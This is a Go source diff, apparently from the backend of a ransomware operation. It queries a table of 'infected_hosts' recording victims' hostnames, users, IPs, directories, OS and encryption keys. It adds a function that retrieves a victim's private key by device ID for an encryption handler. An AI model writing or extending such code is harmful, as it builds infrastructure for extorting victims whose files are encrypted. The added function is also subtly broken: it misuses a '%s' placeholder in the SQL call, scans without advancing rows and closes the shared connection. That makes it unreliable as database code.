@@ -48,7 +48,7 @@ func Query(db *sql.DB) ([]Enumeration, error) {
 
 	results, err := db.Query("SELECT `id`, `hostname`, `user`, `ip`, `pwd`, `os`, `encrypted`, `key` FROM infected_hosts ORDER BY `encrypted`")
 	if err != nil {
-		return nil, fmt.Errorf("could not query the db: %v", err)
+		return nil, err
 	}
 
 	//get all values from db
@@ -75,4 +75,23 @@ func Update(device Enumeration) error {
 	//generates an encryption key for use across the host
 
 	return nil
+}
+
+//Queries the private key based on the passed in device ID
+//Tied to the EncryptHandler
+func PrivateKey(db *sql.DB, ID string) (string, error) {
+	var key string
+	result, err := db.Query("SELECT `key` FROM infected_hosts WHERE `id` = %s", ID)
+	if err != nil {
+		return "", err
+	}
+
+	defer result.Close()
+	defer db.Close()
+
+	err = result.Scan(&key)
+	if err != nil {
+		return "", err
+	}
+	return key, nil
 }
